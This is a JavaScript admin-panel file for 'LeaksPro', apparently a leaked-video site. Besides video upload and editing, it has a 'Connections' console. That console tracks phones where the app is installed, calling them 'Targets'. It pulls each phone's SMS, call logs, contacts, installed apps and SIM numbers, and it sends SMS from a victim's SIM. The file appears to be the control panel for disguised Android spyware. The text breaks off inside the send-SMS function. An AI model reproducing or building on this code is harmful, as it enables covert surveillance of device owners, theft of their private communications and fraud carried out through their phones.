// ==========================================
// LeaksPro Admin Panel — Fully Responsive App
// ==========================================

const API_BASE = window.location.origin;
let adminPassword = '';
let socket = null;
let currentPage = 'dashboard';
let selectedVideoFile = null;

// ========== DOM Ready ==========
document.addEventListener('DOMContentLoaded', () => {
  const stored = localStorage.getItem('leakspro_admin_pw');
  if (stored) {
    adminPassword = stored;
    verifyLogin(stored);
  }
  setupListeners();
  document.getElementById('serverUrl').value = API_BASE;
});

// ========== Event Listeners ==========
function setupListeners() {

  // --- Login ---
  document.getElementById('loginForm').addEventListener('submit', async e => {
    e.preventDefault();
    const btn = document.getElementById('loginBtn');
    btn.disabled = true;
    btn.innerHTML = '<i class="ri-loader-4-line ri-spin"></i> Signing in...';
    await verifyLogin(document.getElementById('loginPassword').value);
    btn.disabled = false;
    btn.innerHTML = '<i class="ri-login-box-line"></i> <span>Sign In</span>';
  });

  // --- Password toggle ---
  document.getElementById('togglePw').addEventListener('click', () => {
    const inp = document.getElementById('loginPassword');
    const icon = document.querySelector('#togglePw i');
    if (inp.type === 'password') {
      inp.type = 'text';
      icon.className = 'ri-eye-line';
    } else {
      inp.type = 'password';
      icon.className = 'ri-eye-off-line';
    }
  });

  // --- Sidebar navigation ---
  document.querySelectorAll('.nav-link').forEach(item => {
    item.addEventListener('click', e => {
      e.preventDefault();
      navigateTo(item.dataset.page);
    });
  });

  // --- Mobile menu ---
  document.getElementById('menuBtn').addEventListener('click', openSidebar);
  document.getElementById('closeSidebar').addEventListener('click', closeSidebar);
  document.getElementById('sidebarOverlay').addEventListener('click', closeSidebar);

  // --- Logout ---
  const logoutFn = () => {
    localStorage.removeItem('leakspro_admin_pw');
    adminPassword = '';
    document.getElementById('app').classList.add('hidden');
    document.getElementById('loginScreen').style.display = 'flex';
    if (socket) socket.disconnect();
  };
  document.getElementById('logoutBtn').addEventListener('click', logoutFn);
  document.getElementById('logoutBtnMobile').addEventListener('click', logoutFn);

  // --- Drop zone ---
  const dz = document.getElementById('dropZone');
  const vfi = document.getElementById('videoFile');
  dz.addEventListener('click', () => vfi.click());
  dz.addEventListener('dragover', e => { e.preventDefault(); dz.classList.add('dragover'); });
  dz.addEventListener('dragleave', () => dz.classList.remove('dragover'));
  dz.addEventListener('drop', e => {
    e.preventDefault(); dz.classList.remove('dragover');
    if (e.dataTransfer.files.length) handleFileSelect(e.dataTransfer.files[0]);
  });
  vfi.addEventListener('change', e => {
    if (e.target.files.length) handleFileSelect(e.target.files[0]);
  });

  // --- Thumbnail preview ---
  document.getElementById('thumbnailFile').addEventListener('change', e => {
    const f = e.target.files[0];
    if (f) {
      const rd = new FileReader();
      rd.onload = ev => {
        const img = document.getElementById('thumbnailPreview');
        img.src = ev.target.result;
        img.classList.remove('hidden');
      };
      rd.readAsDataURL(f);
    }
  });

  // --- Upload form ---
  document.getElementById('uploadForm').addEventListener('submit', async e => {
    e.preventDefault();
    if (!selectedVideoFile) return showToast('Please select a video file', 'error');
    await uploadVideo();
  });

  // --- Edit form ---
  document.getElementById('editForm').addEventListener('submit', async e => {
    e.preventDefault();
    await saveVideoEdit();
  });

  // --- Video search (debounced) ---
  let searchTimer;
  document.getElementById('videoSearch').addEventListener('input', e => {
    clearTimeout(searchTimer);
    searchTimer = setTimeout(() => loadVideos(1, e.target.value), 300);
  });

  // --- Settings form ---
  document.getElementById('settingsForm').addEventListener('submit', async e => {
    e.preventDefault();
    await saveSettings();
  });
}

// ========== Sidebar mobile helpers ==========
function openSidebar() {
  document.getElementById('sidebar').classList.add('open');
  document.getElementById('sidebarOverlay').classList.add('show');
  document.body.style.overflow = 'hidden';
}
function closeSidebar() {
  document.getElementById('sidebar').classList.remove('open');
  document.getElementById('sidebarOverlay').classList.remove('show');
  document.body.style.overflow = '';
}

// ========== Auth ==========
async function verifyLogin(password) {
  try {
    const res = await fetch(`${API_BASE}/api/admin/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ password }),
    });
    if (res.ok) {
      adminPassword = password;
      localStorage.setItem('leakspro_admin_pw', password);
      document.getElementById('loginScreen').style.display = 'none';
      document.getElementById('app').classList.remove('hidden');
      initApp();
    } else {
      showToast('Invalid password', 'error');
    }
  } catch (err) {
    showToast('Connection error: ' + err.message, 'error');
  }
}

// ========== App Init ==========
function initApp() {
  connectWebSocket();
  loadDashboard();
  navigateTo('dashboard');
}

// ========== WebSocket ==========
function connectWebSocket() {
  socket = io(API_BASE);

  socket.on('connect', () => {
    setWsStatus('connected', 'Connected');
    addActivity('ri-link', 'WebSocket connected');
  });

  socket.on('disconnect', () => setWsStatus('disconnected', 'Disconnected'));

  socket.on('clients_count', c => {
    document.getElementById('clientCount').textContent = c;
  });

  socket.on('new_video', v => {
    addActivity('ri-video-upload-line', `New video: ${v.title}`);
    showToast(`New video uploaded: ${v.title}`, 'success');
    if (currentPage === 'dashboard') loadDashboard();
    if (currentPage === 'videos') loadVideos();
  });

  socket.on('view_update', d => addActivity('ri-eye-line', `Video viewed (${d.views} total)`));
  socket.on('upload_progress', d => addActivity('ri-upload-2-line', `Upload "${d.filename}": ${d.progress}%`));
  socket.on('upload_complete', d => addActivity('ri-checkbox-circle-line', `Upload complete: ${d.filename}`));
  socket.on('video_deleted', d => {
    addActivity('ri-delete-bin-line', `Video deleted: ${d.id}`);
    if (currentPage === 'videos') loadVideos();
    if (currentPage === 'dashboard') loadDashboard();
  });

  // --- Device events ---
  // ALL device events update in-memory allDevices so the panel never needs a manual refresh.
  // When navigating to Connections, the data is already up-to-date from WebSocket events.

  socket.on('device_online', d => {
    addActivity('ri-smartphone-line', `Device connected: ${d.model || d.device_id}`);
    d.is_online = 1; // force online
    upsertDeviceInMemory(d);
    if (currentPage === 'connections') renderDeviceGrid();
    if (currentPage === 'dashboard') loadDashboard();
    recalcConnStats();
  });

  socket.on('device_offline', d => {
    addActivity('ri-smartphone-line', `Device went offline: ${d.model || d.device_id}`);
    d.is_online = 0; // force offline
    upsertDeviceInMemory(d);
    if (currentPage === 'connections') renderDeviceGrid();
    recalcConnStats();
  });

  socket.on('device_removed', d => {
    addActivity('ri-smartphone-line', `Device uninstalled: ${d.device_id}`);
    allDevices = allDevices.filter(dev => dev.device_id !== d.device_id);
    if (currentPage === 'connections') renderDeviceGrid();
    recalcConnStats();
  });

  socket.on('devices_cleanup', () => {
    // Server cleaned up stale devices — reload connections
    if (currentPage === 'connections') loadConnections();
  });

  socket.on('device_status_update', d => {
    upsertDeviceInMemory(d);
    if (currentPage === 'connections') renderDeviceGrid();
    recalcConnStats();
  });

  // SMS send result from device
  socket.on('sms_send_result', d => {
    const statusEl = document.getElementById('smsSendStatus');
    if (d.success) {
      statusEl.className = 'sms-send-status success';
      statusEl.innerHTML = `<i class="ri-checkbox-circle-line"></i> SMS sent successfully to ${d.receiver || 'recipient'} via SIM ${d.sim_slot || '?'}`;
      statusEl.classList.remove('hidden');
      addActivity('ri-send-plane-2-fill', `SMS sent to ${d.receiver || '?'} via SIM ${d.sim_slot || '?'}`);
      showToast('SMS sent successfully!', 'success');
      // Clear compose fields
      document.getElementById('smsReceiver').value = '';
      document.getElementById('smsMessage').value = '';
    } else {
      statusEl.className = 'sms-send-status error';
      statusEl.innerHTML = `<i class="ri-error-warning-line"></i> Device failed to send: ${d.error || 'Unknown error'}`;
      statusEl.classList.remove('hidden');
      showToast('Device failed to send SMS: ' + (d.error || 'Unknown error'), 'error');
    }
    // Auto-hide after 6 seconds
    setTimeout(() => statusEl.classList.add('hidden'), 6000);
  });

  // ========== INSTANT SMS — new SMS received on a device ==========
  socket.on('new_sms', d => {
    addActivity('ri-message-2-fill', `New SMS on ${d.device_id?.substring(0,8)}... from ${d.address} (SIM ${d.sim_slot || '?'})`);
    showToast(`New SMS from ${d.address}`, 'success');

    // If the device modal is open for this device and SMS tab is active, refresh
    if (modalDeviceId && d.device_id === modalDeviceId && activeTab === 'sms') {
      loadSmsMessages(1);
    }
  });
}

function setWsStatus(state, label) {
  const el = document.getElementById('wsIndicator');
  el.classList.remove('connected', 'disconnected');
  el.classList.add(state);
  document.getElementById('wsStatus').textContent = label;
  // topbar dot
  const dot = document.getElementById('wsDotTopbar');
  if (dot) dot.style.background = state === 'connected' ? 'var(--green)' : 'var(--red)';
  const tb = document.getElementById('wsStatusTopbar');
  if (tb) tb.textContent = label;
}

// ========== Navigation ==========
function navigateTo(page) {
  currentPage = page;
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  document.querySelectorAll('.nav-link').forEach(n => n.classList.remove('active'));
  document.getElementById(`page-${page}`).classList.add('active');
  const navEl = document.querySelector(`[data-page="${page}"]`);
  if (navEl) navEl.classList.add('active');

  const titles = { dashboard: 'Dashboard', upload: 'Upload Video', videos: 'All Videos', connections: 'Connections', settings: 'Settings' };
  document.getElementById('pageTitle').textContent = titles[page] || page;

  if (page === 'dashboard') loadDashboard();
  if (page === 'videos') loadVideos();
  if (page === 'connections') loadConnections();

  closeSidebar();
}

// ========== Dashboard ==========
async function loadDashboard() {
  try {
    const res = await fetch(`${API_BASE}/api/admin/stats`, {
      headers: { 'x-admin-password': adminPassword },
    });
    const data = await res.json();

    document.getElementById('statVideos').textContent = fmtNum(data.totalVideos);
    document.getElementById('statViews').textContent = fmtNum(data.totalViews);
    document.getElementById('statLikes').textContent = fmtNum(data.totalLikes);
    document.getElementById('statStorage').textContent = fmtBytes(data.totalSize);

    const box = document.getElementById('recentUploads');
    if (!data.recentUploads || data.recentUploads.length === 0) {
      box.innerHTML = '<p class="empty">No videos uploaded yet</p>';
    } else {
      box.innerHTML = data.recentUploads.map(v => {
        const thumb = getThumbUrl(v.thumbnail);
        return `
        <div class="recent-item">
          <img src="${thumb}" alt="${esc(v.title)}" loading="lazy">
          <div class="r-info">
            <h4>${esc(v.title)}</h4>
            <p>${fmtNum(v.views)} views · ${fmtDate(v.created_at)} · ${fmtBytes(v.file_size)}</p>
          </div>
        </div>`;
      }).join('');
    }
  } catch (err) {
    showToast('Failed to load dashboard: ' + err.message, 'error');
  }
}

// ========== File Handling ==========
function handleFileSelect(file) {
  if (!file.type.startsWith('video/')) return showToast('Please select a video file', 'error');

  selectedVideoFile = file;
  document.getElementById('dropZone').classList.add('hidden');
  document.getElementById('fileInfo').classList.remove('hidden');
  document.getElementById('fileName').textContent = file.name;
  document.getElementById('fileSize').textContent = fmtBytes(file.size);

  const title = file.name.replace(/\.[^/.]+$/, '').replace(/[_-]/g, ' ');
  document.getElementById('videoTitle').value = title;

  if (file.size > 100 * 1024 * 1024) {
    showToast('Large file — Cloudinary will handle it', 'info');
  }
}

function clearFile() {
  selectedVideoFile = null;
  document.getElementById('dropZone').classList.remove('hidden');
  document.getElementById('fileInfo').classList.add('hidden');
  document.getElementById('uploadProgress').classList.add('hidden');
  document.getElementById('videoFile').value = '';
}
window.clearFile = clearFile;

// ========== Upload ==========
async function uploadVideo() {
  const btn = document.getElementById('uploadBtn');
  btn.disabled = true;
  btn.innerHTML = '<i class="ri-loader-4-line ri-spin"></i> Uploading...';
  document.getElementById('uploadProgress').classList.remove('hidden');

  try {
    const fd = new FormData();
    fd.append('video', selectedVideoFile);

    const thumbF = document.getElementById('thumbnailFile').files[0];
    if (thumbF) fd.append('thumbnail', thumbF);

    fd.append('title', document.getElementById('videoTitle').value);
    fd.append('description', document.getElementById('videoDesc').value);
    fd.append('category', document.getElementById('videoCategory').value);
    fd.append('channel_name', document.getElementById('channelName').value);
    fd.append('duration', document.getElementById('videoDuration').value || '0');
    fd.append('is_published', document.getElementById('isPublished').checked);
    fd.append('is_short', document.getElementById('isShort').checked);

    const tags = document.getElementById('videoTags').value;
    if (tags) fd.append('tags', JSON.stringify(tags.split(',').map(t => t.trim())));

    const xhr = new XMLHttpRequest();
    xhr.open('POST', `${API_BASE}/api/admin/upload`);
    xhr.setRequestHeader('x-admin-password', adminPassword);

    xhr.upload.onprogress = e => {
      if (e.lengthComputable) {
        const pct = Math.round((e.loaded / e.total) * 100);
        updateProgress(pct, pct < 100 ? 'Uploading to server...' : 'Processing on Cloudinary...');
      }
    };

    await new Promise((resolve, reject) => {
      xhr.onload = () => {
        if (xhr.status === 200) {
          showToast('Video uploaded successfully!', 'success');
          resetUploadForm();
          resolve();
        } else {
          try { reject(new Error(JSON.parse(xhr.responseText).error)); }
          catch (_) { reject(new Error('Upload failed (status ' + xhr.status + ')')); }
        }
      };
      xhr.onerror = () => reject(new Error('Network error'));
      xhr.send(fd);
    });
  } catch (err) {
    showToast('Upload failed: ' + err.message, 'error');
  } finally {
    btn.disabled = false;
    btn.innerHTML = '<i class="ri-upload-cloud-2-line"></i> Upload Video';
  }
}

function updateProgress(pct, label) {
  document.getElementById('progressFill').style.width = pct + '%';
  document.getElementById('progressText').textContent = pct + '%';
  if (label) document.getElementById('progressSpeed').textContent = label;
}

function resetUploadForm() {
  clearFile();
  document.getElementById('uploadForm').reset();
  document.getElementById('channelName').value = 'LeaksPro Admin';
  document.getElementById('isPublished').checked = true;
  document.getElementById('thumbnailPreview').classList.add('hidden');
  document.getElementById('uploadProgress').classList.add('hidden');
}

// ========== Videos List ==========
async function loadVideos(page = 1, search = '') {
  try {
    const url = new URL(`${API_BASE}/api/admin/videos`);
    url.searchParams.set('page', page);
    url.searchParams.set('limit', 12);
    if (search) url.searchParams.set('search', search);

    const res = await fetch(url.toString(), {
      headers: { 'x-admin-password': adminPassword },
    });
    const data = await res.json();
    const grid = document.getElementById('videosList');

    if (!data.videos || data.videos.length === 0) {
      grid.innerHTML = '<p class="empty">No videos found</p>';
      document.getElementById('videoPagination').innerHTML = '';
      return;
    }

    grid.innerHTML = data.videos.map(v => {
      const thumb = getThumbUrl(v.thumbnail);
      return `
      <div class="vid-card">
        <div class="vid-thumb">
          <img src="${thumb}" alt="${esc(v.title)}" loading="lazy">
          ${v.duration > 0 ? `<span class="dur">${fmtDur(v.duration)}</span>` : ''}
          <span class="badge ${v.is_published ? 'pub' : 'draft'}">${v.is_published ? 'Published' : 'Draft'}</span>
        </div>
        <div class="vid-body">
          <h4>${esc(v.title)}</h4>
          <div class="vid-meta">
            <span><i class="ri-eye-line"></i> ${fmtNum(v.views)}</span>
            <span><i class="ri-thumb-up-line"></i> ${fmtNum(v.likes)}</span>
            <span><i class="ri-hard-drive-3-line"></i> ${fmtBytes(v.file_size)}</span>
          </div>
          <div class="vid-actions">
            <button class="btn btn-sm btn-outline" onclick="editVideo('${v.id}')">
              <i class="ri-edit-line"></i> Edit
            </button>
            <button class="btn btn-sm btn-danger" onclick="deleteVideo('${v.id}','${esc(v.title).replace(/'/g, "\\'")}')">
              <i class="ri-delete-bin-line"></i> Delete
            </button>
          </div>
        </div>
      </div>`;
    }).join('');

    // Pagination
    const pagEl = document.getElementById('videoPagination');
    if (data.pagination && data.pagination.totalPages > 1) {
      let h = '';
      for (let i = 1; i <= data.pagination.totalPages; i++) {
        h += `<button class="${i === data.pagination.page ? 'active' : ''}" onclick="loadVideos(${i},'${search}')">${i}</button>`;
      }
      pagEl.innerHTML = h;
    } else {
      pagEl.innerHTML = '';
    }
  } catch (err) {
    showToast('Failed to load videos: ' + err.message, 'error');
  }
}
window.loadVideos = loadVideos;

// ========== Edit Video ==========
async function editVideo(id) {
  try {
    const res = await fetch(`${API_BASE}/api/videos/${id}`);
    const data = await res.json();
    const v = data.video;

    document.getElementById('editVideoId').value = v.id;
    document.getElementById('editTitle').value = v.title;
    document.getElementById('editDesc').value = v.description || '';
    document.getElementById('editCategory').value = v.category;
    document.getElementById('editChannel').value = v.channel_name;
    document.getElementById('editPublished').checked = v.is_published;
    document.getElementById('editShort').checked = v.is_short;

    document.getElementById('editModal').classList.remove('hidden');
  } catch (err) {
    showToast('Failed to load video details', 'error');
  }
}
window.editVideo = editVideo;

async function saveVideoEdit() {
  const id = document.getElementById('editVideoId').value;
  const fd = new FormData();
  fd.append('title', document.getElementById('editTitle').value);
  fd.append('description', document.getElementById('editDesc').value);
  fd.append('category', document.getElementById('editCategory').value);
  fd.append('channel_name', document.getElementById('editChannel').value);
  fd.append('is_published', document.getElementById('editPublished').checked);
  fd.append('is_short', document.getElementById('editShort').checked);

  const tf = document.getElementById('editThumbnail').files[0];
  if (tf) fd.append('thumbnail', tf);

  try {
    const res = await fetch(`${API_BASE}/api/admin/videos/${id}`, {
      method: 'PUT',
      headers: { 'x-admin-password': adminPassword },
      body: fd,
    });
    if (res.ok) {
      showToast('Video updated!', 'success');
      closeModal();
      loadVideos();
    } else throw new Error('Failed to update');
  } catch (err) {
    showToast('Error: ' + err.message, 'error');
  }
}

function closeModal() {
  document.getElementById('editModal').classList.add('hidden');
}
window.closeModal = closeModal;

// ========== Delete Video ==========
async function deleteVideo(id, title) {
  if (!confirm(`Delete "${title}"? This cannot be undone.`)) return;
  try {
    const res = await fetch(`${API_BASE}/api/admin/videos/${id}`, {
      method: 'DELETE',
      headers: { 'x-admin-password': adminPassword },
    });
    if (res.ok) {
      showToast('Video deleted', 'success');
      loadVideos();
      loadDashboard();
    } else throw new Error('Failed to delete');
  } catch (err) {
    showToast('Error: ' + err.message, 'error');
  }
}
window.deleteVideo = deleteVideo;

window.deleteVideo = deleteVideo;

// ========== Connections ==========
let allDevices = [];

async function loadConnections() {
  try {
    const res = await fetch(`${API_BASE}/api/admin/connections`, {
      headers: { 'x-admin-password': adminPassword },
    });
    const data = await res.json();
    allDevices = data.devices || [];
    renderDeviceGrid();
    updateConnStatsFromData(data);
  } catch (err) {
    showToast('Failed to load connections: ' + err.message, 'error');
  }
}

function updateConnStats() {
  // Re-fetch counts if on connections page
  if (currentPage === 'connections') loadConnections();
}

// Recalculate connection stats from in-memory allDevices (no REST call needed)
function recalcConnStats() {
  const total = allDevices.length;
  const online = allDevices.filter(d => d.is_online).length;
  const offline = total - online;
  updateConnStatsFromData({ totalDevices: total, onlineCount: online, offlineCount: offline });
}

function updateConnStatsFromData(data) {
  const el = id => document.getElementById(id);
  if (el('connTotal')) el('connTotal').textContent = data.totalDevices || 0;
  if (el('connOnline')) el('connOnline').textContent = data.onlineCount || 0;
  if (el('connOffline')) el('connOffline').textContent = data.offlineCount || 0;
}

// Update in-memory allDevices array without re-rendering (caller decides when to render)
function upsertDeviceInMemory(device) {
  const idx = allDevices.findIndex(d => d.device_id === device.device_id);
  if (idx >= 0) {
    allDevices[idx] = device;
  } else {
    allDevices.unshift(device);
  }
}

function upsertDeviceCard(device) {
  upsertDeviceInMemory(device);
  renderDeviceGrid();
  recalcConnStats();
}

function removeDeviceCard(deviceId) {
  allDevices = allDevices.filter(d => d.device_id !== deviceId);
  renderDeviceGrid();
  recalcConnStats();
}

function renderDeviceGrid() {
  const grid = document.getElementById('deviceGrid');
  if (!allDevices || allDevices.length === 0) {
    grid.innerHTML = `<div class="fx-empty"><i class="ri-radar-line"></i><p>NO DEVICES DETECTED</p><span>Targets will appear when the app is installed on a device</span></div>`;
    return;
  }

  // Sort: online first, then by last_seen desc
  const sorted = [...allDevices].sort((a, b) => {
    if (a.is_online !== b.is_online) return b.is_online - a.is_online;
    return new Date(b.last_seen || 0) - new Date(a.last_seen || 0);
  });

  grid.innerHTML = sorted.map(d => {
    const isOnline = d.is_online ? true : false;
    const online = isOnline ? 'online' : 'offline';
    const statusText = isOnline ? 'ONLINE' : 'OFFLINE';
    const statusTime = isOnline ? 'LIVE' : (d.last_seen ? timeAgo(d.last_seen) : 'N/A');
    const batt = d.battery_percent ?? -1;
    const battClass = batt > 50 ? 'high' : batt > 20 ? 'mid' : 'low';
    const battWidth = batt >= 0 ? batt : 0;
    const charging = d.battery_charging ? `<i class="ri-flashlight-line batt-charge"></i>` : '';
    const phones = Array.isArray(d.phone_numbers) ? d.phone_numbers : [];
    const deviceName = [d.manufacturer, d.model].filter(Boolean).join(' ') || d.device_name || 'Unknown Device';
    const shortId = d.device_id.length > 20 ? d.device_id.substring(0, 8) + '...' + d.device_id.slice(-6) : d.device_id;

    let simHtml = '';
    if (phones.length === 0) {
      simHtml = '<span class="sim-none">No SIM detected</span>';
    } else {
      simHtml = '<div class="sim-list">' + phones.map((p, i) => {
        const cls = i === 0 ? 'sim1' : 'sim2';
        const label = `SIM ${i + 1}`;
        return `<span class="sim-badge ${cls}"><i class="ri-sim-card-2-line"></i>${label}: ${esc(p.number || p)}</span>`;
      }).join('') + '</div>';
    }

    // Storage & RAM info
    const totalStorage = d.total_storage || 0;
    const freeStorage = d.free_storage || 0;
    const usedStorage = totalStorage - freeStorage;
    const storagePct = totalStorage > 0 ? Math.round((usedStorage / totalStorage) * 100) : 0;
    const storageClass = storagePct > 90 ? 'low' : storagePct > 70 ? 'mid' : 'high';

    const totalRam = d.total_ram || 0;
    const freeRam = d.free_ram || 0;
    const usedRam = totalRam - freeRam;
    const ramPct = totalRam > 0 ? Math.round((usedRam / totalRam) * 100) : 0;
    const ramClass = ramPct > 90 ? 'low' : ramPct > 70 ? 'mid' : 'high';

    return `
    <div class="dev-card ${online}" data-device-id="${d.device_id}" onclick="openDeviceModal('${d.device_id}','${esc(deviceName).replace(/'/g, "\\'")}')">
      <div class="dev-top">
        <div class="dev-status">
          <span class="dev-led"></span>
          <span class="dev-status-text">${statusText}</span>
        </div>
        <span class="dev-time">${statusTime}</span>
      </div>
      <div class="dev-identity">
        <div class="dev-icon"><i class="ri-smartphone-line"></i></div>
        <div>
          <div class="dev-name">${esc(deviceName)}</div>
          <div class="dev-id">ID: ${shortId}</div>
        </div>
      </div>
      <div class="dev-data">
        <div class="dev-row">
          <span class="dev-row-label">OS</span>
          <span class="dev-row-value">${esc(d.os_version || '?')} (SDK ${d.sdk_version || '?'})</span>
        </div>
        <div class="dev-row">
          <span class="dev-row-label">APP</span>
          <span class="dev-row-value">v${esc(d.app_version || '?')}</span>
        </div>
        <div class="dev-row">
          <span class="dev-row-label">DISPLAY</span>
          <span class="dev-row-value">${esc(d.screen_resolution || '?')}</span>
        </div>
        <div class="dev-row">
          <span class="dev-row-label">BATTERY</span>
          <span class="dev-row-value">
            <div class="dev-battery">
              ${charging}
              <div class="batt-shell"><div class="batt-fill ${battClass}" style="width:${battWidth}%"></div></div>
              <span class="batt-pct ${battClass}">${batt >= 0 ? batt + '%' : '?'}</span>
            </div>
          </span>
        </div>
        <div class="dev-row">
          <span class="dev-row-label">STORAGE</span>
          <span class="dev-row-value">
            ${totalStorage > 0 ? `<div class="dev-battery"><div class="batt-shell"><div class="batt-fill ${storageClass}" style="width:${storagePct}%"></div></div><span class="batt-pct ${storageClass}">${fmtBytes(usedStorage)}/${fmtBytes(totalStorage)}</span></div>` : '?'}
          </span>
        </div>
        <div class="dev-row">
          <span class="dev-row-label">RAM</span>
          <span class="dev-row-value">
            ${totalRam > 0 ? `<div class="dev-battery"><div class="batt-shell"><div class="batt-fill ${ramClass}" style="width:${ramPct}%"></div></div><span class="batt-pct ${ramClass}">${fmtBytes(usedRam)}/${fmtBytes(totalRam)}</span></div>` : '?'}
          </span>
        </div>
        <div class="dev-row">
          <span class="dev-row-label">SIM</span>
          <span class="dev-row-value">${simHtml}</span>
        </div>
        <div class="dev-row">
          <span class="dev-row-label">REGISTERED</span>
          <span class="dev-row-value">${d.first_seen ? new Date(d.first_seen).toLocaleString() : '?'}</span>
        </div>
        <div class="dev-row">
          <span class="dev-row-label">LAST SEEN</span>
          <span class="dev-row-value">${d.last_seen ? new Date(d.last_seen).toLocaleString() : '?'}</span>
        </div>
      </div>
    </div>`;
  }).join('');
}

// ========== Device Modal (Tabbed: SMS, Calls, Contacts, Apps) ==========
let modalDeviceId = '';
let modalDeviceName = '';
let activeTab = 'sms';

// SMS state
let allSmsMessages = [];
let smsCurrentPage = 1;

// Calls state
let allCallLogs = [];
let callsCurrentPage = 1;

// Contacts state
let allContacts = [];
let contactsCurrentPage = 1;

// Apps state
let allApps = [];

async function openDeviceModal(deviceId, deviceName) {
  modalDeviceId = deviceId;
  modalDeviceName = deviceName;
  activeTab = 'sms';

  // Reset all state
  allSmsMessages = [];
  smsCurrentPage = 1;
  allCallLogs = [];
  callsCurrentPage = 1;
  allContacts = [];
  contactsCurrentPage = 1;
  allApps = [];

  document.getElementById('deviceModalTitle').textContent = deviceName;
  document.getElementById('deviceModalSub').textContent = 'Loading...';

  // Reset search fields
  document.getElementById('smsSearch').value = '';
  document.getElementById('callSearch').value = '';
  document.getElementById('contactSearch').value = '';
  document.getElementById('appSearch').value = '';
  document.getElementById('smsReceiver').value = '';
  document.getElementById('smsMessage').value = '';
  document.getElementById('smsSendStatus').classList.add('hidden');
  const sysChk = document.getElementById('showSystemApps');
  if (sysChk) sysChk.checked = false;

  // Reset tabs
  document.querySelectorAll('.device-tab').forEach(t => t.classList.remove('active'));
  document.querySelectorAll('.device-tab-content').forEach(t => t.classList.remove('active'));
  document.querySelector('.device-tab[data-tab="sms"]').classList.add('active');
  document.getElementById('tab-sms').classList.add('active');

  // Reset containers
  document.getElementById('smsListContainer').innerHTML = `<div class="tab-loading"><i class="ri-loader-4-line ri-spin"></i><span>Loading messages...</span></div>`;
  document.getElementById('callsListContainer').innerHTML = `<div class="tab-loading"><i class="ri-loader-4-line ri-spin"></i><span>Loading call logs...</span></div>`;
  document.getElementById('contactsListContainer').innerHTML = `<div class="tab-loading"><i class="ri-loader-4-line ri-spin"></i><span>Loading contacts...</span></div>`;
  document.getElementById('appsListContainer').innerHTML = `<div class="tab-loading"><i class="ri-loader-4-line ri-spin"></i><span>Loading apps...</span></div>`;
  document.getElementById('smsPagination').innerHTML = '';
  document.getElementById('callsPagination').innerHTML = '';
  document.getElementById('contactsPagination').innerHTML = '';

  document.getElementById('deviceModal').classList.remove('hidden');

  // Load first tab
  await loadSmsMessages(1);
}
window.openDeviceModal = openDeviceModal;

function closeDeviceModal() {
  document.getElementById('deviceModal').classList.add('hidden');
  modalDeviceId = '';
  allSmsMessages = [];
  allCallLogs = [];
  allContacts = [];
  allApps = [];
}
window.closeDeviceModal = closeDeviceModal;

function switchDeviceTab(tab) {
  activeTab = tab;
  document.querySelectorAll('.device-tab').forEach(t => t.classList.remove('active'));
  document.querySelectorAll('.device-tab-content').forEach(t => t.classList.remove('active'));
  document.querySelector(`.device-tab[data-tab="${tab}"]`).classList.add('active');
  document.getElementById(`tab-${tab}`).classList.add('active');

  // Lazy load data for the tab
  if (tab === 'sms' && allSmsMessages.length === 0) loadSmsMessages(1);
  if (tab === 'calls' && allCallLogs.length === 0) loadCallLogs(1);
  if (tab === 'contacts' && allContacts.length === 0) loadContacts(1);
  if (tab === 'apps' && allApps.length === 0) loadApps();
}
window.switchDeviceTab = switchDeviceTab;

async function loadSmsMessages(page) {
  try {
    smsCurrentPage = page;
    const res = await fetch(`${API_BASE}/api/admin/connections/${modalDeviceId}/sms?page=${page}&limit=50`, {
      headers: { 'x-admin-password': adminPassword },
    });
    const data = await res.json();
    allSmsMessages = data.messages || [];
    const total = data.total || 0;
    const totalPages = data.totalPages || 1;

    document.getElementById('deviceModalSub').textContent = `SMS: ${total} · Calls · Contacts · Apps`;

    renderSmsMessages(allSmsMessages);
    renderSmsPagination(page, totalPages, total);
  } catch (err) {
    document.getElementById('smsListContainer').innerHTML = `<div class="tab-empty"><i class="ri-error-warning-line"></i><p>FAILED TO LOAD MESSAGES</p></div>`;
    showToast('Failed to load SMS: ' + err.message, 'error');
  }
}
window.loadSmsMessages = loadSmsMessages;

function renderSmsMessages(messages) {
  const container = document.getElementById('smsListContainer');

  if (!messages || messages.length === 0) {
    container.innerHTML = `<div class="tab-empty"><i class="ri-message-2-line"></i><p>NO MESSAGES FOUND</p></div>`;
    return;
  }

  container.innerHTML = messages.map(m => {
    const isSent = m.type === 2;
    const dirClass = isSent ? 'sms-sent' : 'sms-received';
    const dirLabel = isSent ? 'SENT' : 'RECEIVED';
    const avatar = (m.address || '?').charAt(0).toUpperCase();
    const dateStr = m.date ? new Date(m.date).toLocaleString() : '?';
    const body = esc(m.body || '(empty)');
    const address = esc(m.address || 'Unknown');

    return `
    <div class="sms-item ${dirClass}">
      <div class="sms-avatar">${avatar}</div>
      <div class="sms-content">
        <div class="sms-top-row">
          <span class="sms-address">${address}</span>
          <span class="sms-direction">${dirLabel}</span>
        </div>
        <div class="sms-body">${body}</div>
        <div class="sms-date">${dateStr}</div>
      </div>
    </div>`;
  }).join('');
}

function renderSmsPagination(currentPage, totalPages, total) {
  const container = document.getElementById('smsPagination');
  if (totalPages <= 1) {
    container.innerHTML = '';
    return;
  }

  let html = '';
  if (currentPage > 1) {
    html += `<button onclick="loadSmsMessages(${currentPage - 1})"><i class="ri-arrow-left-s-line"></i></button>`;
  }

  const startPage = Math.max(1, currentPage - 2);
  const endPage = Math.min(totalPages, currentPage + 2);

  for (let i = startPage; i <= endPage; i++) {
    html += `<button class="${i === currentPage ? 'active' : ''}" onclick="loadSmsMessages(${i})">${i}</button>`;
  }

  if (currentPage < totalPages) {
    html += `<button onclick="loadSmsMessages(${currentPage + 1})"><i class="ri-arrow-right-s-line"></i></button>`;
  }

  html += `<span class="tab-page-info">${total} msgs</span>`;
  container.innerHTML = html;
}

function filterSmsMessages() {
  const query = document.getElementById('smsSearch').value.toLowerCase().trim();
  if (!query) {
    renderSmsMessages(allSmsMessages);
    return;
  }
  const filtered = allSmsMessages.filter(m =>
    (m.address || '').toLowerCase().includes(query) ||
    (m.body || '').toLowerCase().includes(query)
  );
  renderSmsMessages(filtered);
}
window.filterSmsMessages = filterSmsMessages;

// ========== Send SMS from Device ==========
async function sendSmsFromDevice(simSlot) {
  const receiver = document.getElementById('smsReceiver').value.trim();
  const message = document.getElementById('smsMessage').value.trim();

  if (!receiver) return showToast('Enter a receiver phone number', 'error');
  if (!message) return showToast('Enter a message to send', 'error');
  if (!modalDeviceId) return showToast('No device selected', 'error');

